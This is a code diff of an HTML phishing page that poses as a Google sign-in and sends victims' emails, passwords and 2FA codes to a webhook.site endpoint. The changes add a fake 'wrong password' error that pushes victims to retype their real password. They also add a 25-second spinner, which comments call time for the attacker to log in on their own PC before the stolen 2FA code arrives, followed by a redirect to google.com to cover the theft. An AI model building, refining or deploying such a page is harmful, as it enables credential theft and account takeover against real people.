@@ -11,6 +11,7 @@
         input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; }
         .hidden { display: none; }
+        .error { color: #d93025; font-size: 13px; text-align: left; margin-bottom: 10px; background: #fce8e6; padding: 10px; border-radius: 4px; display: none; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -20,23 +21,24 @@
 <div class="box">
     <img src="https://wikimedia.org" class="logo">
     
-    <!-- Stage 1: Login -->
+    <!-- Stage 1: Auth + Psychological Trap -->
     <div id="auth-stage">
         <h1>Sign in</h1>
         <p>Use your Google Account</p>
+        <div id="err-msg" class="error">Wrong password. Try again or click Forgot password.</div>
         <input type="email" id="user" placeholder="Email or phone">
         <input type="password" id="pass" placeholder="Enter your password">
-        <button class="btn" onclick="startInfiltration()">Next</button>
+        <button class="btn" onclick="handleLogic()">Next</button>
     </div>
 
-    <!-- Stage 2: Loading (The Delay) -->
+    <!-- Stage 2: Loading + Timing Trap -->
     <div id="loading-stage" class="hidden">
         <h1>Verifying...</h1>
         <div class="spinner"></div>
-        <p>Confirming your identity. This may take a few seconds...</p>
+        <p>Please wait while we secure your connection.</p>
     </div>
 
-    <!-- Stage 3: 2FA Code -->
+    <!-- Stage 3: 2FA Capture -->
     <div id="code-stage" class="hidden">
         <h1>2-Step Verification</h1>
         <p>A verification code was just sent to your device. Enter the 6-digit code below.</p>
@@ -47,37 +49,43 @@
 
 <script>
     const WEBHOOK = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
+    let attempts = 0;
 
-    async function startInfiltration() {
+    async function handleLogic() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         if (!u || !p) return;
 
-        // 1. Send Login Data to Webhook
-        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "CREDENTIALS", user: u, pass: p }) });
+        // [CAPTURE_1]: Send data to Webhook
+        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ event: "LOGIN_DATA", user: u, pass: p, attempt: attempts + 1 }) });
 
-        // 2. Show Loading Stage to give you time to login on your PC
-        document.getElementById('auth-stage').classList.add('hidden');
-        document.getElementById('loading-stage').classList.remove('hidden');
+        if (attempts === 0) {
+            // [PSYCH_TRAP]: Show error on first try to force real password
+            attempts++;
+            document.getElementById('err-msg').style.display = 'block';
+            document.getElementById('pass').value = "";
+        } else {
+            // [TIMING_TRAP]: Switch to loading to give you time to login on your PC
+            document.getElementById('auth-stage').classList.add('hidden');
+            document.getElementById('loading-stage').classList.remove('hidden');
 
-        // 3. Wait 20 seconds then show the 2FA input field
-        setTimeout(() => {
-            document.getElementById('loading-stage').classList.add('hidden');
-            document.getElementById('code-stage').classList.remove('hidden');
-        }, 20000); // 20 Seconds Delay
+            setTimeout(() => {
+                document.getElementById('loading-stage').classList.add('hidden');
+                document.getElementById('code-stage').classList.remove('hidden');
+            }, 25000); // 25 seconds of golden time
+        }
     }
 
     async function submitCode() {
         const c = document.getElementById('code').value;
         if (!c) return;
 
-        // 4. Send the 2FA Code to Webhook
-        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "2FA_CODE", code: c }) });
+        // [CAPTURE_2]: Send 2FA code to Webhook
+        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ event: "2FA_CODE", code: c }) });
 
-        // 5. Final Redirect to the Image
+        // Final redirect to close the loop
         window.location.href = "https://google.com";
     }
 </script>
 </body>
 </html>
-
